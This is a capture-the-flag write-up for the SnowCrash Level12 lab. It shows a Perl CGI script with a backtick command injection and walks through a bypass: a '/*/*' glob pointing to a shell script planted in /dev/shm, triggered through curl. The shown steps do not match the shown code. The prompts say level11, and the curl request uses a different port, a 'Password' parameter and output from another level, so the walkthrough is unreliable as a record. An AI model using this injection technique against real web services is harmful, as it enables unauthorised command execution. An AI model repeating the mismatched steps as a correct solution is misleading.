#SnowCrash Level12

Lets go ahead and see what we have here.
```
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

Same as the level before :

It's like an RCE(remote code execution).
But if you pay attention to the regex, any lowercase characters passed will become uppercase.
And for the second regex anything that is passed after spaces will be deleted.
So the only way to use this is through a file that's execute a command.
And since we can't use filenames we have to do a "/*/*".
/tmp doesn't have the right permissions.
let's look arround for a bit to find a folder that has the write permissions for public.
Using this command :
```
level11@SnowCrash:~$ find / -writable 2>/dev/null | grep -v proc
/dev/vboxuser
/dev/log
/dev/shm
/dev/char/10:56
/dev/char/5:0
/dev/char/5:2
/dev/char/10:200
/dev/char/10:229
/dev/char/1:5
/dev/char/1:9
/dev/char/1:8
/dev/char/1:3
/dev/char/1:7
/dev/stderr
/dev/stdout
/dev/stdin
/dev/fd
/dev/pts/0
/dev/net/tun
/dev/ptmx
/dev/fuse
/dev/tty
/dev/urandom
/dev/random
/dev/full
/dev/zero
/dev/null
/run/acpid.socket
/run/dbus/system_bus_socket
/run/shm
/run/lock
/tmp
/var/crash
/var/lib/php5
/var/lock
/var/tmp
/rofs/dev/urandom
/rofs/var/lock
```

Can't use the first 2 so I used the 3rd one.
```
level11@SnowCrash:~$ cat /dev/shm/EXPLOIT
#!/bin/sh

getflag > /tmp/flaghh
```

Then :
```
level11@SnowCrash:~$ curl 'localhost:5151/?Password=`/*/*/EXPLOIT`'
Password: Erf nope..
level11@SnowCrash:~$ cat /tmp/flaghh
Check flag.Here is your token : 
```